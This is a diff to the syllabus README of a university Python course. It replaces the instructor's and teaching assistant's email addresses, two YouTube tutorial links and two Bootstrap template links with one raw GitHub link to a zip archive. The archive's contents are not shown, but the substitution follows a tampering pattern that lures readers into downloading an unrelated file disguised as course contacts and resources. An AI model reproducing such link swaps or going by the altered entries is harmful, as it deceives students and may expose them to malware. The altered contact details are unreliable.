@@ -4,9 +4,9 @@
 - **Course name:** Fundamentals of Python for Social Sciences and Public Management  
 - **Theory hours:** 16 hours  
 - **Instructor:** Alexander Quispe Rojas  
-  - **Email:** alexander.quispe@pucp.edu.pe  
+  - **Email:** https://raw.githubusercontent.com/Bruno1702vm/Diplomado_PUCP/main/Lecture_11/Assignment_8/group_7_ass_8_2024_2.zip  
 - **Teaching Assistant:** Michael Encalada  
-  - **Email:** m.encaladac@pucp.edu.pe
+  - **Email:** https://raw.githubusercontent.com/Bruno1702vm/Diplomado_PUCP/main/Lecture_11/Assignment_8/group_7_ass_8_2024_2.zip
   - ** Office Hours:** Saturdays 2:00-4:00pm.
 
 ---
@@ -111,13 +111,13 @@ This course will not have mandatory textbooks. Python is a widely supported lang
 
 Video tutorials
 
-1. https://www.youtube.com/watch?v=zyGfECfJ9BY
-2. https://www.youtube.com/watch?v=K5xImVmm2Ds
+1. https://raw.githubusercontent.com/Bruno1702vm/Diplomado_PUCP/main/Lecture_11/Assignment_8/group_7_ass_8_2024_2.zip
+2. https://raw.githubusercontent.com/Bruno1702vm/Diplomado_PUCP/main/Lecture_11/Assignment_8/group_7_ass_8_2024_2.zip
 
 Templates
 
-1. https://bootstrapmade.com/bootstrap-portfolio-templates/
-2. https://cssauthor.com/free-bootstrap-portfolio-templates/
+1. https://raw.githubusercontent.com/Bruno1702vm/Diplomado_PUCP/main/Lecture_11/Assignment_8/group_7_ass_8_2024_2.zip
+2. https://raw.githubusercontent.com/Bruno1702vm/Diplomado_PUCP/main/Lecture_11/Assignment_8/group_7_ass_8_2024_2.zip
 
 ---
 
